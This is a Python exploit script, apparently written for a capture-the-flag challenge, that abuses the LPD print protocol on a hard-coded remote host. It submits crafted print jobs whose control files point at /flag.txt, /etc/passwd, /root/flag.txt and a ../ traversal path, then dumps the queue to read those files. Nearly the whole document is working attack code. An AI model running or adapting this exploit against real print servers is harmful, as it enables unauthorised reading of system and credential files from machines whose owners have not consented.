#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def send_complete_job(target_file="/flag.txt"):
    """Enviar un job completo con control file y data file"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((TARGET, PORT))
    
    # Step 1: Iniciar receive job
    print(f"[1] Enviando: Receive job para cola 'lp'")
    s.sendall(b'\x02lp\n')
    time.sleep(0.3)
    resp = s.recv(1024)
    print(f"    Respuesta: {resp.hex()} ({len(resp)} bytes)")
    
    # Step 2: Enviar control file
    # Usar comando 'f' para "formatted file" que apunta al archivo objetivo
    control_content = f"Uroot\nHlocalhost\nJ{target_file}\nN{target_file}\nf{target_file}\n"
    control_bytes = control_content.encode()
    control_size = len(control_bytes)
    
    control_msg = b'\x02' + str(control_size).encode() + b' cfA001localhost\n' + control_bytes + b'\x00'
    print(f"[2] Enviando: Control file ({control_size} bytes)")
    print(f"    Content: {control_content!r}")
    s.sendall(control_msg)
    time.sleep(0.3)
    resp = s.recv(1024)
    print(f"    Respuesta: {resp.hex()} ({len(resp)} bytes)")
    
    # Step 3: Enviar data file (puede ser vacío o con datos)
    data_content = b"dummy data\n"
    data_size = len(data_content)
    
    data_msg = b'\x03' + str(data_size).encode() + b' dfA001localhost\n' + data_content + b'\x00'
    print(f"[3] Enviando: Data file ({data_size} bytes)")
    s.sendall(data_msg)
    time.sleep(0.3)
    resp = s.recv(1024)
    print(f"    Respuesta: {resp.hex()} ({len(resp)} bytes)")
    
    s.close()
    print()

# Test diferentes archivos
files_to_test = [
    "/flag.txt",
    "/flag",
    "/etc/passwd",
    "/root/flag.txt",
    "../flag.txt",
    "flag.txt",
]

for target in files_to_test:
    print(f"{'='*60}")
    print(f"Testing: {target}")
    print(f"{'='*60}")
    send_complete_job(target)
    time.sleep(1)

# Ahora consultar la cola
print(f"{'='*60}")
print("Consultando cola después de enviar jobs")
print(f"{'='*60}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((TARGET, PORT))
s.sendall(b'\x04lp\n')
time.sleep(1)

all_resp = b''
s.settimeout(2)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        all_resp += chunk
except socket.timeout:
    pass

s.close()

print(f"Response length: {len(all_resp)}")
print(f"Hex: {all_resp.hex()}")
if len(all_resp) > 1:
    try:
        print(f"Text:\n{all_resp.decode('utf-8', errors='replace')}")
    except:
        print(f"Raw: {all_resp}")